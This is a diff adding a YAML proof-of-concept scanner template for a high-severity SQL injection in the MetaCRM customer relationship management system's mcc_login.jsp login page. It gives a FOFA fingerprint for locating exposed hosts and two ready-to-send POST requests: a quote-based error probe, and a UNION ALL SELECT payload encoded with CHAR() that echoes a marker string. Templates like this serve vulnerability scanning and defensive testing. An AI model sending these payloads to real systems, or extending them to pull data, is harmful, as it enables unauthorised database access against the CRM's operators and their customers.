@@ -1,0 +1,29 @@
+id: poc-yaml-metacrm-mcc-login-jsp-sqli
+info:
+  name: MetaCRM客户关系管理系统 mcc_login.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: MetaCRM客户关系管理系统
+  fofa: body="/common/scripts/basic.js"
+requests:
+- method: POST
+  path: /si/callcenter/solarun/mcc_login.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: workerid=1%27&passwd=ab123def&rtype=call400
+  expression: status_code == 500 && contains(body,"java.sql.SQLException")
+- method: POST
+  path: /si/callcenter/solarun/mcc_login.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: workerid=1%27+UNION+ALL+SELECT+CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28103%29%2BCHAR%28100%29%2BCHAR%2875%29%2BCHAR%28105%29%2BCHAR%2876%29%2BCHAR%2881%29%2BCHAR%2890%29%2BCHAR%2873%29%2BCHAR%28105%29%2BCHAR%2873%29%2BCHAR%28104%29%2BCHAR%28104%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%2887%29%2BCHAR%2883%29%2BCHAR%28121%29%2BCHAR%28114%29%2BCHAR%28106%29%2BCHAR%2881%29%2BCHAR%2866%29%2BCHAR%2890%29%2BCHAR%2865%29--+ewaD&passwd=ab123def&rtype=call400
+  expression: 'status_code == 200 &&
+
+    contains(body,"name=\"username\"") &&
+
+    contains(body,"qjzvqgdKiLQZIiIhhjbWSyrjQBZA")
+
+    '
+variables: {}
+transport: http
